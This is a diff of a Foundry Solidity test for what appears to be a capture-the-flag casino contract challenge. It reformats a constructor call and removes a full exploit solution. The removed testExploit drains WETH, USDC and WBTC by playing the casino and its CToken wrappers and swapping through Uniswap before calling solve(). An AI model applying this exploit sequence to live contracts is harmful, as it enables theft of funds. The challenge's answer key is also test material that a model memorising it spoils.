@@ -21,8 +21,9 @@ contract CasinoAdvancedTest is Test {
         uint256 fullScore = 100;
         do {
             vm.rollFork(block.number - 1);
-            base =
-            new CasinoAdvancedBase(startTime, endTime, fullScore, Config.USDC, Config.WBTC, Config.WETH, Config.UNISWAPV2_ROUTER02);
+            base = new CasinoAdvancedBase(
+                startTime, endTime, fullScore, Config.USDC, Config.WBTC, Config.WETH, Config.UNISWAPV2_ROUTER02
+            );
             router = IRouter02(Config.UNISWAPV2_ROUTER02);
             you = makeAddr("you");
             deal(Config.USDC, you, 100e6);
@@ -34,38 +35,5 @@ contract CasinoAdvancedTest is Test {
         } while (casino.slot() == 0);
     }
 
-    function testExploit() public {
-        vm.startPrank(you);
-        // play with WETH
-        casino.play(Config.WETH, 500e18);
-        casino.withdraw(Config.WETH, 1_000e18);
-        // play with USDC
-        IERC20(Config.WETH).approve(address(router), type(uint256).max);
-        address[] memory path = new address[](2);
-        path[0] = Config.WETH;
-        path[1] = Config.USDC;
-        router.swapTokensForExactTokens(500_000e6, 1_000e18, path, you, block.timestamp);
-        IERC20(Config.USDC).approve(address(casino), type(uint256).max);
-        skip(1);
-        casino.play(Config.USDC, 500_000e6);
-        skip(1);
-        casino.play(casino.CToken(Config.USDC), 500_000e6);
-        casino.withdraw(Config.USDC, 1_500_000e6);
-        // play with WBTC
-        IERC20(Config.USDC).approve(address(router), type(uint256).max);
-        path = new address[](2);
-        path[0] = Config.USDC;
-        path[1] = Config.WBTC;
-        router.swapTokensForExactTokens(0.5e8, 1_500_000e6, path, you, block.timestamp);
-        IERC20(Config.WBTC).approve(address(casino), type(uint256).max);
-        skip(1);
-        casino.play(Config.WBTC, 0.5e8);
-        skip(1);
-        casino.play(casino.CToken(Config.WBTC), 0.5e8);
-        casino.withdraw(Config.WBTC, 1.5e8);
-        // solve
-        base.solve();
-        assertTrue(base.isSolved());
-        vm.stopPrank();
-    }
+    function testExploit() public {}
 }
